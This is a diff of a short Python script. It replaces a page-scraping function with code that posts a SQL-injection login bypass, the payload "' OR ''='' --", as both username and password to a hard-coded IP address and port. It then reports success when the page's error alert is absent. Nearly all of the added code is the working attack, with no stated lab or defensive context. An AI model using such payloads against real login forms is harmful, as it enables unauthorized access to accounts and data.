@@ -1,23 +1,26 @@
 import requests
 
-def save_web_content_to_html(url, file_name):
-    try:
-        # Sending a GET request
-        response = requests.get(url)
+# Define the target URL
+url = 'http://140.115.59.7:12005/'  # Replace 'your_website_url_here' with the actual URL
 
-        # Checking the response status code
-        if response.status_code == 200:
-            # Saving the web content to a file
-            with open(file_name, 'w', encoding='utf-8') as file:
-                file.write(response.text)
-            print(f"Successfully saved the web content as {file_name}")
-        else:
-            print(f"Failed to access the URL, Status Code: {response.status_code}")
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
+# Set your username and password
+username = ' "’ OR ‘’=‘’-- "'
+password = ' "’ OR ‘’=‘’-- "'
 
-if __name__ == "__main__":
-    url_to_scrape = 'http://140.115.59.7:12005/'
-    file_to_save = 'index.html'
+# Craft the POST request data
+data = {
+    'username': username,
+    'password': password,
+    'submit': 'ログイン'  # Replace with the appropriate button text if needed
+}
 
-    save_web_content_to_html(url_to_scrape, file_to_save)
+# Send the POST request
+response = requests.post(url, data=data)
+
+# Check if the login status message is present in the response HTML
+if 'alert alert-danger d-flex align-items-center' in response.text:
+    # If the login status message is found, print it
+    print("Login failed: Invalid username or password")
+else:
+    # If the login status message is not found, consider the login successful
+    print("Login successful!")
